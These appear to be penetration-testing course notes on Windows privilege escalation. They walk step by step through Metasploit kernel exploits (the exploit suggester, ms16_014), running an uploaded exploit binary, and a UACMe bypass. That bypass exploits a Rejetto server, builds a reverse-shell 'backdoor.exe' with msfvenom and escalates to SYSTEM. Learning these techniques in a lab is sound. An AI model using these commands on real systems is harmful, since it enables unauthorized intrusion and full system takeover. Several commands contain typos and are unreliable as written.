# Windows Kernel Exploits

## Privilege Escalation
- Privilege Escalation involves exploiting vulnerabilities or misconfigurations to elevate access from a standard user to one with administrative or root privileges.
- This is critical in a penetration test to gain full control of a system after an initial compromise.
- Once a foothold is gained, escalating privileges allows you to perform tasks that require higher-level access.

## Windows Kernel
- The Kernel is the core component of an operating system, managing system resources and hardware interactions.
- **Windows NT Kernel**: Used by all versions of Microsoft Windows, with two main operation modes:
  - **User Mode**: Limited access to system resources, typically for standard applications and services.
  - **Kernel Mode**: Full access to system resources, used by the OS to manage hardware and execute critical system functions.
  
- Exploiting the Windows kernel allows code execution with the highest system privileges, potentially leading to full control over the target system.

## Windows Kernel Exploitation
- **Targeting Vulnerabilities**: Windows kernel exploits focus on specific vulnerabilities to execute code with elevated privileges.
- **Privilege Escalation Process**:
  - Identify kernel vulnerabilities.
  - Download, compile, and transfer kernel exploits to the target system.

## Tools & Environment:
- **Windows Exploit Suggester**: Compares the target's patch levels against a vulnerability database to detect missing patches and potential exploits.
- **Windows-Kernel-Exploits**: A collection of Windows Kernel exploits sorted by CVE.

## Demo

1. **List Active Sessions**  
   `sessions`  
   - Lists all active sessions. Identifies available sessions, such as a PowerShell or Meterpreter session.

2. **Attempt Privilege Escalation with Meterpreter**  
   `getsystem`  
   - Attempts to elevate privileges to system level within the current session.

3. **Search for the Exploit Suggester Module**  
   `search suggester`  
   - Searches for modules related to exploit suggestion in Metasploit. Prepares to use the Windows Exploit Suggester.

4. **Select the Exploit Suggester Module**  
   `use 0`  
   - Selects the first module from the search results.

5. **Show Module Options**  
   `show options`  
   - Displays configurable options for the selected module.

6. **List Active Sessions Again**  
   `sessions`  
   - Lists sessions to identify the session number needed for further exploitation.

7. **Run the Exploit Suggester**  
   `run`  
   - Enumerates vulnerabilities on the target system and suggests applicable Metasploit modules.

8. **Use the Suggested Kernel Exploit**  
   `use exploit/windows/local/ms16_014_wmi_recv_notif`  
   - Loads the specific kernel exploit module for privilege escalation.

9. **Show Exploit Options**  
   `show options`  
   - Displays the settings required for the loaded exploit module.

10. **Set the Session ID**  
    `set SESSION 3`  
    - Specifies the session to use for the exploit. Adjust according to the active session ID.

11. **Set Local Port**  
    `set LPORT 4422`  
    - Configures the local port for the reverse shell connection.

12. **Execute the Kernel Exploit**  
    `exploit`  
    - Runs the exploit, attempting to gain elevated privileges on the target system.

13. **Check User Identity Post-Exploitation**  
    `getuid`  
    - Confirms the current user’s identity to verify successful privilege escalation.

14. **Background the Current Session**  
    `background`  
    - Backgrounds the current session, keeping it active while allowing further actions.

15. **Switch to the Unprivileged Session**  
    `session 3`  
    - Switches to an unprivileged session for verification.

16. **Check User Identity Again**  
    `getuid`  
    - Verifies the identity in the unprivileged session.

### Using Windows Exploit Suggester

1. **Open a Shell on the Target**  
   `shell`  
   - Drops to a command shell on the target system.

2. **Gather System Information**  
   `systeminfo`  
   - Collects system information, including installed hotfixes, to assess vulnerabilities.

3. **Copy System Information to a Text File**  
   - Create a text file (`win7.txt`) to save `systeminfo` output for further analysis.

4. **Update the Exploit Suggester Database**  
   `./windows-exploit-suggester.py --update`  
   - Updates the vulnerability database for the Windows Exploit Suggester tool.

5. **Run the Exploit Suggester**  
   `./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`  
   - Compares the system info with the database to suggest applicable exploits.

6. **Transfer the Exploit to the Target System**  
   `upload ~/Downloads/41015.exe`  
   - Uploads the selected exploit binary to the target system.

7. **Navigate to the Temp Directory**  
   `cd C:\\tEMP`  
   - Moves to the temporary directory on the target system, a safe location to execute the exploit.

8. **Execute the Exploit**  
   `.\41015.exe`  
   - Runs the uploaded kernel exploit on the target system.

9. **Check for Elevated Privileges**  
   `whoami`  
   - Confirms successful privilege escalation by checking the user identity, expecting "nt authority\system".
  
  THis metasploit module can be used to identify kernel exploits on a target:
  multi/recon/local_exploit_suggester

# Bypassing UAC With UACMe
- User Account Control (UAC) is a Windows security feature introducedin Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group
- A non-privileged user attempting to execute a program with elevated privileges will be promoted with the UAC credential prompt, whereas a privileged user will be prompted with with a consent prompt.
- Attacks can bypass UAC in order to execute malicious executables with elevaed privileges.

## Bypassing UAC
- We will need to have access to a user account that is part of the local administrators group on the Windows target system
- UAC allowes a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
- Tool and technique used will depend on the version of Windows running on the target system.
## Bypassing UAC With UACME
- UACMe is an open source, robust privilege escalation tool which can be used to bypass Windows UAC by leveraging various techniques.
- UACMe GitHub repository contains a documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt WIndows AuteElevate tool.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

## Demo

`nmap [target IP]`
vulnerable http fileserver

`service postgresql start && msfconsole`
starting metasploit to exploit the http fileserver vulnerability.

`setg rhosts [target IP]`
We set the target ip as rhost and "G" so we don't have to retype it when we load a new metasploit module.

`search rejetto`
Rejetto fileserver which is vulnerable

`use [found payload]`

`exploit`
meterpreter session successful

Perform basic enumeration:

meterpreter: `sysinfo`
Which OS, Build etc

meterpreter: `pgrep explorer`
search for explorer process

meterpreter: `migrate 2448`

meterpreter: `sysinfo`

meterpreter: `getuid`

meterpreter: `getprivs` N

meterpreter: `shell`: verifying that this user is part of the local administrator group

shell: `netuser`

shell: `net localgroup administrators`: admin and administrator are part of the administrator group

Now after we gained access to the target system and verified that the user is part of the local administrator group, we take a closer look at UACME on GitHub

shell: `exit`

we generate a meterpreter payload with msfvenom, then transfering it to the target and we will use the akagi executable with the key 23 and we will then execute the payload that we generated and that should bypass UAC

new tab:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -f exe > backdoor.exe`

`ls`
we have backdoor.exe uploaded

`msfconsole`


msfconsole: `use multi/handler`
msfconsole: `set payload windows/meterpreter/reverse_tcp`
msfconsole: `set LHOST [own IP]`
msfconsole: `set LPORT 1234`
msfconsole: `run`
Reverse TCP Handler is now ready to recieve the malicious payload we generated.

Back to the meterpreter session:

meterpeter: `pwd`

meterpeter: `getuid`

meterpeter: `getprivs`

meterpeter: `cd C:\\`

meterpeter: `mkdir Temp`

meterpeter: `cd Temp`

meterpeter: `upload backdoor.exe`

meterpreter: `upload /root/Desktop/tools/UACME/Akagi64.exe`

meterpreter: `shell`

Shell: `dir`

If we want to execute backdoor.exe with admin privileges, it wont work because of UAC. To bypass UAC we use method/kex 23
Shell. `Akagi64.exe 23 C:\Temp\backdoor.exe`: On the tcp handler we get a new meterpreter session (target).
`getprivs`
`ps`: we can migrate to any of these services (NT Authority\System
`migrate 688`
`sysinfo`


